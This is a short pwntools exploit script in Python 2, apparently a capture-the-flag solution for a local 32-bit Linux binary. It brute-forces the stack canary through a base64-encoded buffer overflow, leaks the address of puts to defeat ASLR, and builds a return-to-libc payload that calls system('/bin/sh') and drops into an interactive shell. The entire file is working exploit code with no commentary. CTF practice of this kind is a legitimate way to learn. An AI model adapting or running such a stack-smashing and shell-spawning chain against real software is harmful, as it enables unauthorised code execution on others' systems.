from pwn import *
from base64 import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
path = '/home/zander/Desktop/ctf/pwns'
elf = ELF(path)
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')

puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']
vulc_addr = 0x080487E6 # get_input_base64()
p = process(path)

# brute
canary = '\x00'
p.recvuntil('May be I can know if you give me some data[Y/N]\n')
for i in xrange(3):
    for j in xrange(256):
        p.send('Y\n')
        p.send(b64encode('a'*257+ canary + chr(j))) # char v21[257];
        recv = p.recvuntil('May be I can know if you give me some data[Y/N]\n')
        if 'Finish' in recv:
            canary += chr(j)
            break
print 'find canary:' + canary.encode('hex')

# payload1 = 'a'*257 + canary + 'a'*12 + flat(puts_plt_addr, vulc_addr, puts_got_addr)
payload1 = 'a'*257 + canary + 'a'*12 + p32(puts_plt_addr) + p32(vulc_addr) + p32(puts_got_addr)
p.send('Y\n')
p.recvuntil('Give me some datas:\n\n')
p.send(b64encode(payload1))
puts_addr = p.recv()[268:268+4]
system_addr = libc.symbols['system'] - libc.symbols['puts'] + u32(puts_addr)
sh_addr = next(libc.search('/bin/sh'))- libc.symbols['puts'] + u32(puts_addr)
p.send('Y\n')
p.send('Y\n')
payload2 = 'a'*257 + canary + 'a'*12 + flat(system_addr, p32(1), sh_addr)
p.send(b64encode(payload2))
p.interactive()

# b *0x08048B2F call    get_input_base64

# v21 0xffffce9b ~ 0xffffcf9c(canary)